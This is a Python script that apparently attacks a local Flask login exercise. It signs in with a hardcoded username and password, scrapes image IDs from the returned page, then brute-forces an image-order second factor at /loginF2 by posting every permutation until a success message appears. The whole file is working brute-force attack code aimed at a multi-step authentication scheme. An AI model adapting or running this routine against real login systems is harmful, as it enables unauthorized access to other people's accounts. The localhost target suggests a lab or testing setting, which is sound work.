import requests
import time

url2 = "http://127.0.0.1:5000/loginF2"

################################################################
s = requests.Session()
url1 = 'http://127.0.0.1:5000/login'
start_time = time.time()
longin_data={"username" :"sinjab", "password":"4idl!f@vw#3nfh",} 
response = s.post(url1, longin_data)

with open('file.txt', 'w') as file:
    file.write(response.text)
    file.close  



################################################################
imgs_name_list=[]

f=open("file.txt","r")
for a in f :
    b=str(a)
    if 'url(static/images/' in b:
        imgs_name_list.append(b) 

img_list =[]

for i in imgs_name_list:
    img_list.append(str(str(i).split('id="')[1]).split('"')[0])


###############################################################


index_list=list(range(0, len(img_list)))
index_list.reverse() 

def no_repet(liist):
    for i in liist:
        count=0
        for x in liist:
            if i == x:
                count=count+1
                if count==2:
                    return False
    return True

def gen_key_from(indexes):
    key=''
    for i in indexes:
        key=key+img_list[i]
    return str(key)

def main():
    index=0
    while True:   
        if no_repet(index_list):
            key= gen_key_from(index_list)
            longin_data={"img_password":key}
            r = s.post(url2, longin_data)
            print (key)
            if "Well done !" in str(r.text) :
                print ("The user password has been found:")
                print("the id of photos is "+key)
                print("--- %s seconds ---" % (time.time() - start_time))    
                break
        
        try:
            while index_list[index] > (len(index_list)-2):
                index_list[index]=0
                index=index+1
            
            index_list[index]=index_list[index]+1
            index=0
        except:
            print("Done!")
            break
main()
